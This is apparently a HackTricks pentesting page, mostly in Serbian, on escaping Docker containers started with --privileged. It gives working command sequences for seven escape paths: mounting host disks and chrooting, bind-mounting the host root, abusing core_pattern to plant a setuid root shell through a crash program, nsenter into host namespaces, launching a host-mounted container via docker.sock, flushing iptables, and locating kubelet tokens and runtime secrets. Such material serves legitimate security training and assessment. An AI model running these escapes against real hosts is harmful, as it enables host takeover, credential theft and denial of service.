# Bekstvo iz `--privileged` kontejnera

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Kontejner pokrenut sa `--privileged` nije isto što i običan kontejner sa jednom ili dve dodatne permisije. U praksi, `--privileged` uklanja ili slabi nekoliko podrazumevanih runtime zaštita koje obično drže workload podalje od opasnih host resursa. Tačan efekat i dalje zavisi od runtime-a i hosta, ali za Docker je uobičajeni rezultat:

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

Važna posledica je da privilegovani kontejner obično **ne** zahteva suptilan kernel exploit. U mnogim slučajevima može jednostavno da komunicira direktno sa host uređajima, host-facing kernel filesystems, ili runtime interfejsima, i zatim pivotira u host shell.

## Šta `--privileged` ne menja automatski

`--privileged` does **not** automatically join the host PID, network, IPC, or UTS namespaces. Privilegovani kontejner i dalje može imati privatne namespaces. To znači da neki lanci za bekstvo zahtevaju dodatni uslov kao što su:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Ti uslovi su često laki za zadovoljenje u realnim pogrešnim konfiguracijama, ali su konceptualno odvojeni od samog `--privileged`.

## Putanje za bekstvo

### 1. Montiranje host diska preko izloženih uređaja

Kontejner pokrenut sa `--privileged` obično vidi znatno više uređajnih čvorova pod `/dev`. Ako je host block device vidljiv, najjednostavniji put bekstva je da ga montirate i `chroot` u host filesystem:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ako root particija nije očigledna, prvo izlistajte raspored blokova:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Ako je praktičan pristup da se postavi setuid helper u writable host mount umesto `chroot`, imajte na umu da ne svaki fajl sistem poštuje setuid bit. Brza provera mogućnosti na hostu je:
```bash
mount | grep -v "nosuid"
```
Ovo je korisno zato što su upisivi putevi u okviru `nosuid` datotečnih sistema mnogo manje interesantni za klasične "drop a setuid shell and execute it later" tokove rada.

Oslabljene zaštite koje se ovde zloupotrebljavaju su:

- potpuno izlaganje uređaja
- široke capabilities, posebno `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montirajte ili ponovo iskoristite host bind mount i `chroot`

Ako je root datotečni sistem hosta već montiran unutar kontejnera, ili ako kontejner može kreirati neophodne mount tačke zato što je privilegovan, shell hosta je često udaljen samo jedan `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako ne postoji host root bind mount, ali je host storage dostupan, kreirajte jedan:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ovaj put zloupotrebljava:

- oslabljena mount ograničenja
- pune capabilities
- nedostatak MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Zloupotreba upisivih `/proc/sys` ili `/sys`

Jedna od velikih posledica `--privileged` je da zaštite procfs i sysfs postanu znatno slabije. To može otkriti host-facing kernel interfejse koji su normalno maskirani ili montirani samo za čitanje.

Klasičan primer je `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ostale putanje visokog značaja uključuju:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ovaj put zloupotrebljava:

- nedostajuće maskirane putanje
- nedostajuće sistemske putanje u režimu read-only

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Koristite pune capabilities za Mount- ili Namespace-Based Escape

Privilegovan kontejner dobija capabilities koje se obično uklanjaju iz standardnih kontejnera, uključujući `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i mnoge druge. To je često dovoljno da lokalno uporište postane host escape čim postoji neka druga izložena površina.

Jednostavan primer je montiranje dodatnih datotečnih sistema i korišćenje namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ako je host PID takođe podeljen, korak postaje još kraći:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ovaj put zloupotrebljava:

- podrazumevani privileged capability set
- opciono deljenje host PID-a

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Bekstvo preko runtime sockets

Privileged container često završi tako što su host runtime stanje ili sockets vidljivi. Ako je Docker, containerd, ili CRI-O socket dostupan, najjednostavniji pristup često je koristiti runtime API za pokretanje drugog containera sa host pristupom:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Za containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ovaj put zloupotrebljava:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Povezane stranice:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Uklanjanje neželjenih efekata mrežne izolacije

`--privileged` samo po sebi ne pridružuje host network namespace, ali ako kontejner takođe ima `--network=host` ili neki drugi host-network access, čitav network stack postaje promenljiv:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Ovo nije uvek direktan host shell, ali može dovesti do denial of service, traffic interception, ili pristupa loopback-only management services.

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Čitanje host secrets i runtime state

Čak i kada clean shell escape nije neposredan, privileged containers često imaju dovoljno pristupa da pročitaju host secrets, kubelet state, runtime metadata, i neighboring container filesystems:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ako je `/var` montiran na hostu ili su runtime direktorijumi vidljivi, to može biti dovoljno za lateral movement ili krađu kredencijala za cloud/Kubernetes čak i pre nego što se dobije host shell.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Provere

Svrha sledećih komandi je da potvrde koje privileged-container escape families su odmah izvodljive.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Šta je ovde zanimljivo:

- puni set capability-ja, posebno `CAP_SYS_ADMIN`
- izloženost proc/sys sa mogućnošću pisanja
- vidljivi host uređaji
- nedostatak seccomp i MAC confinement
- runtime soketi ili host root bind mount-ovi

Bilo koji od ovih može biti dovoljan za post-exploitation. Nekoliko njih zajedno obično znači da je container funkcionalno udaljen jednu ili dve komande od host compromise.

## Povezane stranice

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
